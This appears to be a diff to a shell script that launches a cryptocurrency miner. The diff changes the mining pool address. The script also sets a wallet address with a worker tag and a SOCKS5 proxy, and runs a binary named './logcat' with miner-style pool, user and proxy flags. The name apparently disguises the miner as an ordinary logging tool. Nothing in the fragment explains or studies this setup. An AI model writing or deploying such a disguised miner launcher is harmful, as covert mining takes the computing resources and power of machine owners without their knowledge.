@@ -1,4 +1,4 @@
-POOL=rx.unmineable.com:3333
+POOL=na.mine.zpool.ca:4563
 WALLET=D9zT4xf7iGNcbrH6nLEKBCqjmiC3yKPwc2.cpu1
 PROXY=socks5://username:password@127.0.0.1:3333
 ./logcat -v -l $POOL -u $WALLET -x $PROXY
